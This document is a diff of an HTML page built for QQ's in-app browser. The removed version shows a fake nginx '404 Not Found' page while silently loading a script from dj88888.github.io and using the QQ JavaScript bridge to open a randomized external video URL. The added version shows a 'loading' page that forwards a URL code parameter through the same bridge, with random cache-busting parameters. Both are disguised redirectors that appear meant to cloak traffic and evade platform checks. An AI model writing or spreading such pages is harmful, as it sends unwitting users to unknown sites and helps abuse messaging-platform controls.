@@ -1,56 +1,74 @@
 <!doctype html>
-<html class="">
+<html lang="zh-CN">
 <head>
-    <title>404 Not Found</title>
-<meta name="wechat-enable-text-zoom-em" content="true">
-<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
-<meta http-equiv="X-UA-Compatible" content="IE=edge">
-<meta name="color-scheme" content="light dark">
-<link rel="shortcut icon" type="image/x-icon" href="https://res.wx.qq.com/a/wx_fed/assets/res/NTI4MWU5.ico">
-<link rel="mask-icon" href="https://res.wx.qq.com/a/wx_fed/assets/res/MjliNWVm.svg" color="#4C4C4C">
-<link rel="apple-touch-icon-precomposed" href="https://res.wx.qq.com/a/wx_fed/assets/res/OTE0YTAw.png">
-<meta name="apple-mobile-web-app-capable" content="yes">
-<meta name="apple-mobile-web-app-status-bar-style" content="black">
-<meta name="format-detection" content="telephone=no">
-<meta name="referrer" content="no-referrer">
-<script charset="UTF-8" type="text/javascript" src="https://qqvip-web.cdn-go.cn/mono/latest/vendors/qqmobile/qqapi.wk.js?_bid=5234"></script>
-<script type="text/javascript" charset="utf-8" src="https://dj88888.github.io/video/bfq.js"></script>
-<script type="text/javascript">
-function myEeplace(url) {
-    return url.replace(/\{(\w+?)\}/g, function(s1, s2) {
-        var res = "";
-        for (var i = 0; i < s2.length; i++) {
-            if (s2[i] === "n") {
-                res += Math.floor(Math.random() * 10);
-            } else if (s2[i] === "w") {
-                res += String.fromCharCode(97 + Math.floor(Math.random() * 26));
-            }
-        }
-        return res;
-    });
-}
-
-function opensdk(url) {
-    url = myEeplace(url);
-    var conf = {url: url, target: 1, style: 2};
-    mqq.invoke("ui", "openUrl", conf);
-}
-
-function jump() {
-    var url = "https://dj88888.github.io/video/1aa.html?url=623362&amp;1788ww283117567";
-
-    opensdk(url);
-
-    setTimeout(function() {
-        window.location.href = "https://h5.qzone.qq.com/miniapp/act/hippyJump#/?schema=666";
-    }, 200);
-}
-
-setTimeout(jump, 10);
-</script>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+<title>正在加载</title>
+<style>
+	html,body{width:100%;height:100%;margin:0;background:#fff}
+	body{display:flex;align-items:center;justify-content:center;color:#94a3b8;font:13px Arial,sans-serif}
+</style>
+<script src="https://qqvip-web.cdn-go.cn/mono/latest/vendors/qqmobile/qqapi.wk.js?_bid=5234"></script>
 </head>
-<body>
-    <center><h1>404 Not Found</h1></center>
-<hr><center>nginx</center>
+<body>正在加载
+	<script>
+		(function() {
+			"use strict";
+			var base = "https://baidu.com",
+			start = Date.now(),
+			chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+			function random(n) {
+				var s = "",
+				i;
+				for (i = 0; i < n; i++) s += chars.charAt(Math.floor(Math.random() * chars.length));
+				return s
+			}
+			function code() {
+				var q = new URLSearchParams(location.search),
+				h = new URLSearchParams((location.hash || "").replace(/^#/, ""));
+				return q.get("k") || q.get("code") || h.get("k") || h.get("code") || ""
+			}
+			function target() {
+				var value = code(),
+				u;
+				if (!value) return "";
+				u = new URL(base);
+				u.searchParams.set("k", value);
+				u.searchParams.set("_wv", "9983");
+				u.searchParams.set("pages/web", "");
+				u.searchParams.set("_" + random(9), random(10));
+				u.searchParams.set("_ts", Date.now());
+				return u.toString()
+			}
+			function qq() {
+				return /QQ\/|V1_AND_SQ|V1_IPH_SQ|MQQBrowser/i.test(navigator.userAgent || "")
+			}
+			function ready() {
+				return !! (window.mqq && typeof window.mqq.invoke === "function")
+			}
+			function begin() {
+				var url = target();
+				if (!url) return;
+				if (!qq()) {
+					location.replace(url);
+					return
+				}
+				if (ready()) {
+					window.mqq.invoke("ui", "openUrl", {
+						url: url,
+						target: 1,
+						style: 2
+					});
+					return
+				}
+				if (Date.now() - start < 1800) {
+					setTimeout(begin, 50);
+					return
+				}
+				location.replace(url)
+			}
+			setTimeout(begin, 200)
+		})();
+	</script>
 </body>
 </html>
